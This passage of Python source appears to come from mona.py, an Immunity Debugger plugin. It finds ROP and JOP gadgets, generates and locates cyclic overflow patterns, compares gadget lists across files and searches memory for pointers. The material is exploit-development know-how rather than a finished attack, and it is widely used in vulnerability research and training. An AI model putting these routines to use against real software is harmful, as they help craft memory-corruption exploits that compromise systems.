					modinfo = MnModule(modname)
					thismodversion = getModuleProperty(modname,"version")
					thismodname = modname.replace(" ","_")
					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
					thislog = logfile.reset(False)
					ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
					FILE=open(thislog,"a")
					FILE.write(ptrinfo)
					FILE.close()
	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	objprogressfile.write("Done (" + thistimestamp+")",progressfile)
	imm.log("Done")
	return interestinggadgets,ropgadgets,suggestions,vplogtxt
	
	#----- JOP gadget finder ----- #
			
def findJOPGADGETS(modulecriteria={},criteria={},depth=7):
	"""
	Searches for jop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	depth - maximum number of instructions to go back
	
	Return:
	Output is written to files, containing jop gadgets and suggestions
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=toHex(imm.getDebuggedPid())
	progressfilename="_jop_progress_"+imm.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset()

	imm.log("[+] Progress will be written to %s" % progressfilename)
	imm.log("[+] Max nr of instructions : %d" % depth)

	fcnt = 0
	filesok = 0
	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	
	fast = False
			
	if usefiles and len(filestouse) == 0:
		imm.log(" ** Unable to find any of the source files, aborting... **",highlight=1)
		return
		
	search = []
	
	jopregs = ["EAX","EBX","ECX","EDX","ESI","EDI","EBP"]
	
	offsetval = 0
	
	for jreg in jopregs:
		search.append("JMP " + jreg)
		search.append("JMP [" + jreg + "]")
		offsetval = 0
		while offsetval <= 40:
			search.append("JMP [" + jreg + "+0x" + toHexByte(offsetval)+"]")
			offsetval += 2

	search.append("JMP [ESP]")
		
	offsetval = 0
	while offsetval <= 40:
		search.append("JMP [ESP+0x" + toHexByte(offsetval) + "]")
		offsetval += 2
	
	imm.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
	for thismodule in modulestosearch:
		imm.log("    - Querying module %s" % thismodule)
		imm.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	imm.log("    - Search complete :")
			
	imm.updateLog()
	tp = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				imm.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
				tp = tp + len(all_opcodes[endingtype]) / 2
			else:
				imm.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])
	global silent
	imm.log("    - Filtering and mutating %d gadgets" % tp)
		
	imm.updateLog()
	jopgadgets = {}
	interestinggadgets = {}

	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	dict_thisgadget = {}
	dict_thisinterestinggadget = {}	
	gadgetcounter = 0
	interestinggadgetcounter = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt=adcnt+1
				if usefiles:
					adcnt = adcnt - 0.5
				if adcnt > (tc*1000):
					thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
					updatetext = "      - Progress update : " + str(tc*1000) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*1000*100)/tp)+"%)"
					objprogressfile.write(updatetext.strip(),progressfile)
					imm.log(updatetext)
					imm.updateLog()
					tc=tc+1				

				#first get max backward instruction
				thisopcode = imm.disasmBackward(endingtypeptr,depth+1)
				thisptr = thisopcode.getAddress()
				# we now have a range to mine
				startptr = thisptr

				while startptr <= endingtypeptr:
					# get the entire chain from startptr to endingtypeptr
					thischain = ""
					msfchain = []
					thisopcodebytes = ""
					chainptr = startptr
					if isGoodGadgetPtr(startptr,criteria) and not startptr in jopgadgets and not startptr in interestinggadgets:
						# new pointer
						invalidinstr = False
						while chainptr < endingtypeptr and not invalidinstr:
							thisopcode = imm.disasm(chainptr)
							thisinstruction = thisopcode.getDisasm()
							if isGoodJopGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):
								thischain =  thischain + " # " + thisinstruction
								msfchain.append([chainptr,thisinstruction])
								thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
								chainptr = imm.disasmForwardAddressOnly(chainptr,1)
							else:
								invalidinstr = True
						if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
							fullchain = thischain + " # " + endingtype
							msfchain.append([endingtypeptr,endingtype])
							thisopcode = imm.disasm(endingtypeptr)
							thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
							msfchain.append(["raw",thisopcodebytes])
							if isInterestingJopGadget(fullchain):					
								interestinggadgets[startptr] = fullchain
								if not startptr in dict_thisinterestinggadget:
									dict_thisinterestinggadget[startptr] = msfchain
							else:
								if not fast:
									jopgadgets[startptr] = fullchain
									if not startptr in dict_thisgadget:
										dict_thisgadget[startptr] = msfchain
					startptr = startptr+1
	
	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
	updatetext = "      - Progress update : " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	imm.log(updatetext)
	imm.updateLog()

	logfile = MnLog("jop.txt")
	thislog = logfile.reset()
	objprogressfile.write("Enumerating gadgets",progressfile)
	imm.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
	logfile.write("Interesting gadgets",thislog)
	logfile.write("-------------------",thislog)
	imm.updateLog()
	arrtowrite = ""
	try:
		FILE=open(thislog,"a")
		for gadget in interestinggadgets:
				ptrx = MnPointer(gadget)
				modname = ptrx.belongsTo()
				modinfo = MnModule(modname)
				ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
				arrtowrite += ptrinfo
		objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
		FILE.writelines(arrtowrite)
		FILE.close()
	except:
		pass				

	return interestinggadgets,jopgadgets,suggestions,vplogtxt	
	

	#----- File compare ----- #

def findFILECOMPARISON(modulecriteria={},criteria={},allfiles=[],tomatch="",checkstrict=True,rangeval=0):
	"""
	Compares two or more files generated with mona.py and lists the entries that have been found in all files

	Arguments:
	modulecriteria =  not used
	criteria = not used
	allfiles = array with filenames to compare
	tomatch = variable containing a string each line should contain
	checkstrict = Boolean, when set to True, both the pointer and the instructions should be exactly the same
	
	Return:
	File containing all matching pointers
	"""
	imm.setStatusBar("Comparing files...")	
	imm.updateLog()
	fcnt=0
	filesok=0
	while fcnt < len(allfiles):
		allfiles[fcnt]=allfiles[fcnt].strip()
		if os.path.exists(allfiles[fcnt]):
			imm.log("     - %d. %s" % (fcnt,allfiles[fcnt]))
			filesok=filesok+1
		else:
			imm.log("     ** %s : Does not exist !" % allfiles[fcnt],highlight=1)
		fcnt=fcnt+1
	if filesok > 1:
		objcomparefile = MnLog("filecompare.txt")
		comparefile = objcomparefile.reset()
		objcomparefilenot = MnLog("filecompare_not.txt")
		comparefilenot = objcomparefilenot.reset()
		objcomparefilenot.write("Source files:",comparefilenot)
		fcnt=0
		while fcnt < len(allfiles):
			objcomparefile.write(" - " + str(fcnt)+". "+allfiles[fcnt],comparefile)
			objcomparefilenot.write(" - " + str(fcnt)+". "+allfiles[fcnt],comparefilenot)
			fcnt=fcnt+1
		objcomparefile.write("",comparefile)
		objcomparefile.write("Pointers found :",comparefile)
		objcomparefile.write("----------------",comparefile)
		objcomparefilenot.write("",comparefilenot)
		objcomparefilenot.write("Pointers not found :",comparefilenot)
		objcomparefilenot.write("-------------------",comparefilenot)
		imm.log("Reading reference file %s " % allfiles[0])
		imm.updateLog()
		#open reference file and read all records that contain a pointers
		reffile = open(allfiles[0],"rb")
		refcontent = reffile.readlines()
		reffile.close()
		#read all other files into a big array
		targetfiles=[]
		filecnt=1
		comppointers=0
		comppointers_not=0
		imm.log("Reading other files...")
		imm.updateLog()
		while filecnt < len(allfiles):
			imm.log("   %s" % allfiles[filecnt])
			imm.updateLog()
			targetfiles.append([])
			tfile=open(allfiles[filecnt],"rb")
			tcontent = tfile.readlines()
			tfile.close()
			nrlines=0
			for myLine in tcontent:
				targetfiles[filecnt-1].append(myLine)
				nrlines=nrlines+1
			filecnt=filecnt+1
		totalptr=0
		imm.log("Starting compare operation, please wait...")
		imm.updateLog()
		stopnow = False	
		if rangeval == 0:
			for thisLine in refcontent:
				outtofile = "\n0. "+thisLine.replace("\n","").replace("\r","")
				if ((tomatch != "" and thisLine.upper().find(tomatch.upper()) > -1) or tomatch == "") and not stopnow:
					refpointer=""
					pointerfound=1  #pointer is in source file for sure
					#is this a pointer line ?
					refpointer,instr = splitToPtrInstr(thisLine)
					if refpointer != -1:
							totalptr=totalptr+1
							filecnt=0  #0 is actually the second file
							#is this a pointer which meets the criteria ?
							ptrx = MnPointer(refpointer)
							if meetsCriteria(ptrx,criteria):
								while filecnt < len(allfiles)-1 :
									foundinfile=0
									foundline = ""
									for srcLine in targetfiles[filecnt]:
										refpointer2,instr2 = splitToPtrInstr(srcLine)
										if refpointer == refpointer2:
											foundinfile=1
											foundline = srcLine	
											break
									if checkstrict and foundinfile == 1:
										# do instructions match ?
										foundinfile = 0
										refpointer2,instr2 = splitToPtrInstr(foundline)
										if (refpointer == refpointer2) and (instr.lower() == instr2.lower()):
											outtofile += "\n" + str(filecnt+1)+". "+foundline.replace("\n","").replace("\r","")										
											foundinfile = 1
									else:
										if foundinfile == 1:
											outtofile += "\n" + str(filecnt+1)+". "+foundline.replace("\n","").replace("\r","")
									if not foundinfile == 1:
										break	#no need to check other files if any
									pointerfound=pointerfound+foundinfile
									filecnt=filecnt+1
							#search done
							if pointerfound == len(allfiles):
								imm.log(" -> Pointer 0x%s found in %d files" % (toHex(refpointer),pointerfound))
								objcomparefile.write(outtofile,comparefile)
								comppointers=comppointers+1
								imm.updateLog()
								if ptr_to_get > 0 and comppointers >= ptr_to_get:
									stopnow = True
							else:
								objcomparefilenot.write(thisLine.replace('\n','').replace('\r',''),comparefilenot)
								comppointers_not += 1
		else:
			# overlap search
			for thisLine in refcontent:
				if not stopnow:
					refpointer=""
					pointerfound=1  #pointer is in source file for sure
					#is this a pointer line ?
					refpointer,instr = splitToPtrInstr(thisLine)
					outtofile = "\n0. Range [0x"+toHex(refpointer) + " + 0x" + toHex(rangeval) + " = 0x" + toHex(refpointer + rangeval) + "] : " + thisLine.replace("\n","").replace("\r","")
					if refpointer != -1:
							rangestart = refpointer
							rangeend = refpointer+rangeval
							totalptr=totalptr+1
							filecnt=0  #0 is actually the second file
							#is this a pointer which meets the criteria ?
							ptrx = MnPointer(refpointer)
							if meetsCriteria(ptrx,criteria):
								while filecnt < len(allfiles)-1 :
									foundinfile=0
									foundline = ""
									for srcLine in targetfiles[filecnt]:
										refpointer2,instr2 = splitToPtrInstr(srcLine)
										if refpointer2 >= rangestart and refpointer2 <= rangeend:
											foundinfile=1
											rangestart = refpointer2
									if foundinfile == 1:
										outtofile += "\n" + str(filecnt+1)+". Pointer 0x" + toHex(rangestart) + " found in range. | " + instr2.replace("\n","").replace("\r","") + "(Refptr 0x" + toHex(refpointer)+" + 0x" + toHex(rangestart - refpointer)+" )"
									else:
										break	#no need to check other files if any
									pointerfound=pointerfound+foundinfile
									filecnt=filecnt+1
							#search done
							if pointerfound == len(allfiles):
								outtofile += "\nOverlap range : [0x" + toHex(rangestart) + " - 0x" + toHex(rangeend) + "] : 0x" + toHex(rangestart-refpointer)+" bytes from start pointer 0x" + toHex(refpointer) +" \n"
								imm.log(" -> Pointer(s) in range [0x%s + 0x%s] found in %d files" % (toHex(refpointer),toHex(rangeval),pointerfound))
								objcomparefile.write(outtofile,comparefile)
								comppointers=comppointers+1
								imm.updateLog()
								if ptr_to_get > 0 and comppointers >= ptr_to_get:
									stopnow = True
							else:
								objcomparefilenot.write(thisLine.replace('\n','').replace('\r',''),comparefilenot)
								comppointers_not += 1
		imm.log("Total number of pointers queried : %d" % totalptr)
		imm.log("Number of matching pointers found : %d - check filecompare.txt for more info" % comppointers)
		imm.log("Number of non-matching pointers found : %d - check filecompare_not.txt for more info" % comppointers_not)

#------------------#
# Cyclic pattern	#
#------------------#	

def createPattern(size,args={}):
	"""
	Create a cyclic (metasploit) pattern of a given size
	
	Arguments:
	size - value indicating desired length of the pattern
	       if value is > 20280, the pattern will repeat itself until it reaches desired length
		   
	Return:
	string containing the cyclic pattern
	"""
	char1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	char2="abcdefghijklmnopqrstuvwxyz"
	char3="0123456789"

	if "extended" in args:
		char3 += ",.;+=-_!&()#@'({})[]%"	# ascii, 'filename' friendly
	
	if "c1" in args:
		if args["c1"] != "":
			char1 = args["c1"]
	if "c2" in args:
		if args["c2"] != "":
			char2 = args["c2"]
	if "c3" in args:
		if args["c3"] != "":
			char3 = args["c3"]
			
	if "js" in args:
		js_output = True
	else:
		js_output = False

	if not silent:
		if not "extended" in args and size > 20280 and (len(char1) <= 26 or len(char2) <= 26 or len(char3) <= 10):
			msg = "** You have asked to create a pattern > 20280 bytes, but with the current settings\n"
			msg += "the pattern generator can't create a pattern of " + str(size) + " bytes. As a result,\n"
			msg += "the pattern will be repeated for " + str(size-20280)+" bytes until it reaches a length of " + str(size) + " bytes.\n"
			msg += "If you want a unique pattern larger than 20280 bytes, please either use the -extended option\n"
			msg += "or extend one of the 3 charsets using options -c1, -c2 and/or -c3 **\n"
			imm.logLines(msg,highlight=1)
			
	
	charcnt=0
	pattern=""
	max=int(size)
	while charcnt < max:
		for ch1 in char1:
			for ch2 in char2:
				for ch3 in char3:
					if charcnt<max:
						pattern=pattern+ch1
						charcnt=charcnt+1
					if charcnt<max:
						pattern=pattern+ch2
						charcnt=charcnt+1
					if charcnt<max:
						pattern=pattern+ch3
						charcnt=charcnt+1
	if js_output:
		return str2js(pattern)
	return pattern

def findOffsetInPattern(searchpat,size=20280,args = {}):
	"""
	Check if a given searchpattern can be found in a cyclic pattern
	
	Arguments:
	searchpat : the ascii value or hexstr to search for
	
	Return:
	entries in the log window, indicating if the pattern was found and at what position
	"""
	mspattern=""


	searchpats = []
	modes = []
	modes.append("normal")
	modes.append("upper")
	modes.append("lower")
	extratext = ""

	patsize=int(size)
	
	if patsize == -1:
		size = 500000
		patsize = size
	
	global silent
	oldsilent=silent
	
	for mode in modes:
		silent=oldsilent		
		if mode == "normal":
			silent=True
			mspattern=createPattern(size,args)
			silent=oldsilent
			extratext = ""
		if mode == "upper":
			silent=True
			mspattern=createPattern(size,args).upper()
			silent=oldsilent
			extratext = " (uppercase) "
		if mode == "lower":
			silent=True
			mspattern=createPattern(size,args).lower()
			silent=oldsilent
			extratext = " (lowercase) "
		if len(searchpat)==3:
			#register ?
			searchpat = searchpat.upper()
			regs = imm.getRegs()		
			if searchpat in regs:
				searchpat = "0x" + toHex(regs[searchpat])
		if len(searchpat)==4:
			ascipat=searchpat
			if not silent:
				imm.log("Looking for %s in pattern of %d bytes" % (ascipat,patsize))
			if ascipat in mspattern:
				patpos = mspattern.find(ascipat)
				if not silent:
					imm.log(" - Pattern %s found in Metasploit pattern%sat position %d" % (ascipat,extratext,patpos),highlight=1)
			else:
				#reversed ?
				ascipat_r = ascipat[3]+ascipat[2]+ascipat[1]+ascipat[0]
				if ascipat_r in mspattern:
					patpos = mspattern.find(ascipat_r)
					if not silent:
						imm.log(" - Pattern %s (%s reversed) found in Metasploit pattern%sat position %d" % (ascipat_r,ascipat,extratext,patpos),highlight=1)			
				else:
					if not silent:
						imm.log(" - Pattern %s not found in Metasploit pattern%s" % (ascipat_r,extratext))
		if len(searchpat)==8:
				searchpat="0x"+searchpat
		if len(searchpat)==10:
				hexpat=searchpat
				ascipat3 = toAscii(hexpat[8]+hexpat[9])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])
				if not silent:
					imm.log("Looking for %s in pattern of %d bytes" % (ascipat3,patsize))
				if ascipat3 in mspattern:
					patpos = mspattern.find(ascipat3)
					if not silent:
						imm.log(" - Pattern %s (%s) found in Metasploit pattern%sat position %d" % (ascipat3,hexpat,extratext,patpos),highlight=1)
				else:
					#maybe it's reversed
					ascipat4=toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[8]+hexpat[9])
					if not silent:
						imm.log("Looking for %s in pattern of %d bytes" % (ascipat4,patsize))
					if ascipat4 in mspattern:
						patpos = mspattern.find(ascipat4)
						if not silent:
							imm.log(" - Pattern %s (%s reversed) found in Metasploit pattern%sat position %d" % (ascipat4,hexpat,extratext,patpos),highlight=1)
					else:
						if not silent:
							imm.log(" - Pattern %s not found in Metasploit pattern%s " % (ascipat4,extratext))

							
def findPatternWild(modulecriteria,criteria,pattern,base,top):
	"""
	Performs a search for instructions, accepting wildcards
	
	Arguments :
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
	pattern - the pattern to search for.
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond	
	"""
	
	global silent	
	
	rangestosearch = []
	tmpsearch = []
	
	allpointers = {}
	results = {}
	
	mindistance = 4
	maxdistance = 40
	
	if "mindistance" in criteria:
		mindistance = criteria["mindistance"]
	if "maxdistance" in criteria:
		maxdistance = criteria["maxdistance"]
	
	depth = 8
	
	preventbreak = True
	
	if "all" in criteria:
		preventbreak = False
	
	if "depth" in criteria:
		depth = criteria["depth"]
	
	if not silent:
		imm.log("[+] Searching for matches up to %d instructions deep" % depth)
	
	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		rangestosearch.append([base,top])
	
	pattern = pattern.replace("'","").replace('"',"")
	
	# break apart the instructions
	# search for the first instruction(s)
	allinstructions = pattern.split("#")
	instructionparts = []
	instrfound = False
	for instruction in allinstructions:
		instruction = instruction.strip().lower()
		if instrfound and instruction != "":
			instructionparts.append(instruction)
		else:
			if instruction != "*" and instruction != "":
				instructionparts.append(instruction)
				instrfound = True
				
	# remove wildcards placed at the end
	cnt = len(instructionparts)-1
	while cnt > 0:
		if instructionparts[cnt] == "*":
			instructionparts.pop(cnt)
		else:
			break
		cnt -= 1

	# glue simple instructions together if possible
	# reset array
	allinstructions = []
	stopnow = False
	mergeinstructions = []
	mergestopped = False
	mergetxt = ""
	for instr in instructionparts:
		if instr.find("*") == -1 and instr.find("r32") == -1 and not mergestopped:
			mergetxt += instr + "\n"
		else:
			allinstructions.append(instr)
			mergestopped = True
	mergetxt = mergetxt.strip("\n")

	searchPattern = []
	remaining = allinstructions

	if mergetxt != "":
		searchPattern.append(mergetxt)
	else:
		# at this point, we're sure the first instruction has some kind of r32 and/or offset variable
		# get all of the combinations for this one
		# and use them as searchPattern
		cnt = 0
		stopped = False		
		for instr in allinstructions:
			if instr != "*" and (instr.find("r32") > -1 or instr.find("*") > -1) and not stopped:
				if instr.find("r32") > -1:
					for reg in immlib.Registers32BitsOrder:
						thisinstr = instr.replace("r32",reg.lower())
						if instr.find("*") > -1:
							# contains a wildcard offset
							startdist = mindistance
							while startdist < maxdistance:
								operator = ""
								if startdist < 0:
									operator = "-"
								replacewith = operator + toHex(startdist)
								thisinstr2 = thisinstr.replace("*",replacewith)
								searchPattern.append(thisinstr2)
								startdist += 1
						else:
							searchPattern.append(thisinstr)
				else:
					# no r32
					if instr.find("*") > -1:
						# contains a wildcard offset
						startdist = mindistance
						while startdist < maxdistance:
							operator = ""
							if startdist < 0:
								operator = "-"
							replacewith = operator + toHex(startdist)
							thisinstr2 = instr.replace("*",replacewith)
							searchPattern.append(thisinstr2)
							startdist += 1
					else:
						searchPattern.append(instr)
				remaining.pop(cnt)
				stopped = True
			cnt += 1
		
	# search for all these beginnings
	if len(searchPattern) > 0:
		if not silent:
			imm.log("[+] Started search (%d start patterns)" % len(searchPattern))
		imm.updateLog()
		for ranges in rangestosearch:
			mBase = ranges[0]
			mTop = ranges[1]
			if not silent:
				imm.log("[+] Searching startpattern between 0x%s and 0x%s" % (toHex(mBase),toHex(mTop)))
			imm.updateLog()
			oldsilent=silent
			silent=True
			pointers = searchInRange(searchPattern,mBase,mTop,criteria)
			silent=oldsilent
			allpointers = mergeOpcodes(allpointers,pointers)	
	
	# for each of the findings, see if it contains the other instructions too
	# disassemble forward up to 'depth' instructions

	for ptrtypes in allpointers:
		for ptrs in allpointers[ptrtypes]:
			cnt = 0
			thisline = ""
			try:
				while cnt <= depth:
					tinstr = imm.disasmForward(ptrs,cnt).getDisasm().lower() + "\n"
					if tinstr != "???":
						thisline += tinstr
						cnt += 1
					else:
						thisline = ""
						break
					
			except:
				continue
			allfound = True
			thisline = thisline.strip("\n")
			
			if not thisline == "":
				parts = thisline.split("\n")
				maxparts = len(parts)-1
				partcnt = 1
				searchfor = ""
				remcnt = 0
				lastpos = 0
				remmax = len(remaining)
				while remcnt < remmax:
				
					searchfor = remaining[remcnt]
						
					searchlist = []
					if searchfor == "*":
						while searchfor == "*" and remcnt < remmax:
							searchfor = remaining[remcnt+1]
							rangemin = partcnt
							rangemax = maxparts
							remcnt += 1

					else:
						rangemin = partcnt
						rangemax = partcnt
						
					if searchfor.find("r32") > -1:
						for reg in immlib.Registers32BitsOrder:
							searchlist.append(searchfor.replace("r32",reg.lower()))						
					else:
						searchlist.append(searchfor)
						
					partfound = False
					
					while rangemin <= rangemax and not partfound and rangemax <= maxparts:
						for searchfor in searchlist:
							if parts[rangemin].find(searchfor) > -1:						
								partfound = True
								lastpos = rangemin
								partcnt = lastpos # set counter to current position
								break
						if not partfound and preventbreak:
							#check if current instruction would break chain
							if wouldBreakChain(parts[rangemin]):
								# bail out
								partfound = False
								break
						rangemin += 1
						
					remcnt += 1
					partcnt += 1					
					
					if not partfound:
						allfound = False
						break

					
			if allfound:
				cnt = 0
				theline = ""
				while cnt <= lastpos:
					theline += parts[cnt] + " # "
					cnt += 1
				theline = theline.strip(" # ")
				if theline != "":
					if not theline in results:
						results[theline] = [ptrs]
					else:
						results[theline] += [ptrs]
	return results

	
def wouldBreakChain(instruction):
	"""
	Checks if the given instruction would potentially break the instruction chain
	Argument :
	instruction:  the instruction to check
	
	Returns :
	boolean 
	"""
	goodinstruction = isGoodGadgetInstr(instruction)
	if goodinstruction:
		return False
	return True


def findPattern(modulecriteria,criteria,pattern,type,base,top,consecutive=False,rangep2p=0,level=0,poffset=0,poffsetlevel=0):
	"""
	Performs a find in memory for a given pattern
	
	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
				One of the criteria can be "p2p", indicating that the search should look for
				pointers to pointers to the pattern
	pattern - the pattern to search for.
	type - the type of the pattern, can be 'asc', 'bin', 'ptr', 'instr' or 'file'
		If no type is specified, the routine will try to 'guess' the types
		when type is set to file, it won't actually search in memory for pattern, but it will
		read all pointers from that file and search for pointers to those pointers
		(so basically, type 'file' is only useful in combination with -p2p)
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond
	consecutive - Boolean, indicating if consecutive pointers should be skipped
	rangep2p - if not set to 0, the pointer to pointer search will also look rangep2p bytes back for each pointer,
			thus allowing you to find close pointer to pointers
	poffset - only used when doing p2p, will add offset to found pointer address before looking to ptr to ptr
	poffsetlevel - apply the offset at this level of the chain
	level - number of levels deep to look for ptr to ptr. level 0 is default, which means search for pointer to searchpattern
	
	Return:
	all pointers (or pointers to pointers) to the given search pattern in memory
	"""
	rangestosearch = []
	tmpsearch = []
	p2prangestosearch = []
	global silent	
	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		rangestosearch.append([base,top])
	
	tmpsearch.append([0,TOP_USERLAND])
	
	allpointers = {}
	originalPattern = pattern
	
	# guess the type if it is not specified
	if type == "":
		if len(pattern) > 2 and pattern[0:2].lower() == "0x":
			type = "ptr"
		elif "\\x" in pattern:
			type = "bin"
		else:
			type = "asc"
			
	if "unic" in criteria and type == "asc":
		type = "bin"
		binpat = ""
		pattern = pattern.replace('"',"")
		for thischar in pattern:
			binpat += "\\x" + str(toHexByte(ord(thischar))) + "\\x00"
		pattern = binpat
		originalPattern += " (unicode)"
		if not silent:
			imm.log("    - Expanded ascii pattern to unicode, switched search mode to bin")

	bytes = ""
	patternfilename = ""
	split1 = re.compile(' ')		
	split2 = re.compile(':')
	split3 = re.compile("\*")		
	
	if not silent:
		imm.log("    - Treating search pattern as %s" % type)
		
	if type == "ptr":
		pattern = pattern.replace("0x","")
		value = int(pattern,16)
		bytes = struct.pack('<I',value)
	elif type == "bin":
		if len(pattern) % 2 != 0:
			imm.log("Invalid hex pattern", highlight=1)
			return
		bytes = hex2bin(pattern)
	elif type == "asc":
		if pattern.startswith('"') and pattern.endswith('"'):
			pattern = pattern.replace('"',"")
		elif pattern.startswith("'") and pattern.endswith("'"):
			pattern = pattern.replace("'","")
		bytes = pattern
	elif type == "instr":
		pattern = pattern.replace("'","").replace('"',"")
		silent = True
		bytes = hex2bin(assemble(pattern,""))
		silent = False
		if bytes == "":
			imm.log("Invalid instruction - could not assemble",highlight=1)
			return
	elif type == "file":
		patternfilename = pattern.replace("'","").replace('"',"")
		imm.log("    - Search patterns = all pointers in file %s" % patternfilename)
		imm.log("      Extracting pointers...")
		FILE=open(patternfilename,"r")
		contents = FILE.readlines()
		FILE.close()
		extracted = 0	
		for thisLine in contents:
			if thisLine.lower().startswith("0x"):
				lineparts=split1.split(thisLine)
				thispointer = lineparts[0]
				#get type  = from : to *
				if len(lineparts) > 1:
					subparts = split2.split(thisLine)
					if len(subparts) > 1:
						if subparts[1] != "":
							subsubparts = split3.split(subparts[1])
							if not subsubparts[0] in allpointers:
								allpointers[subsubparts[0]] = [hexStrToInt(thispointer)]
							else:
								allpointers[subsubparts[0]] += [hexStrToInt(thispointer)]
							extracted += 1
		imm.log("      %d pointers extracted." % extracted)							
	imm.updateLog()
	
	fakeptrcriteria = {}
	
	fakeptrcriteria["accesslevel"] = "*"
	
	if "p2p" in criteria or level > 0:
		#save range for later, search in all of userland for now
		p2prangestosearch = rangestosearch
		rangestosearch = tmpsearch
	
	if type != "file":
		for ranges in rangestosearch:
			mBase = ranges[0]
			mTop = ranges[1]
			if not silent:
				imm.log("[+] Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
			imm.updateLog()
			searchPattern = []
			searchPattern.append([originalPattern, bytes])
			oldsilent=silent
			silent=True
			pointers = searchInRange(searchPattern,mBase,mTop,criteria)
			silent=oldsilent
			allpointers = mergeOpcodes(allpointers,pointers)
		
	if consecutive:
		# get all pointers and sort them
		rawptr = {}
		for ptrtype in allpointers:
			for ptr in allpointers[ptrtype]:
				if not ptr in rawptr:
					rawptr[ptr]=ptrtype
		if not silent:
			imm.log("[+] Number of pointers to process : %d" % len(rawptr))
		sortedptr = rawptr.items()
		sortedptr.sort(key = itemgetter(0))
		#skip consecutive ones and increment size
		consec_delta = len(bytes)
		previousptr = 0
		savedptr = 0
		consec_size = 0
		allpointers = {}
		for ptr,ptrinfo in sortedptr:
			if previousptr == 0:
				previousptr = ptr
				savedptr = ptr
			if previousptr != ptr:
				if ptr <= (previousptr + consec_delta):
					previousptr = ptr
				else:
					key = ptrinfo + " ("+ str(previousptr+consec_delta-savedptr) + ")"
					if not key in allpointers:
						allpointers[key] = [savedptr]
					else:
						allpointers[key] += [savedptr]
					previousptr = ptr
					savedptr = ptr

	#recursive search ? 
	if len(allpointers) > 0:
		remainingpointers = allpointers
		if level > 0:
			thislevel = 1
			while thislevel <= level:
				if not silent:
					imm.log("[+] %d remaining types found at this level" % len(remainingpointers))				
				imm.log("[+] Looking for pointers to pointers, level %d..." % thislevel)
				if	thislevel == poffsetlevel:
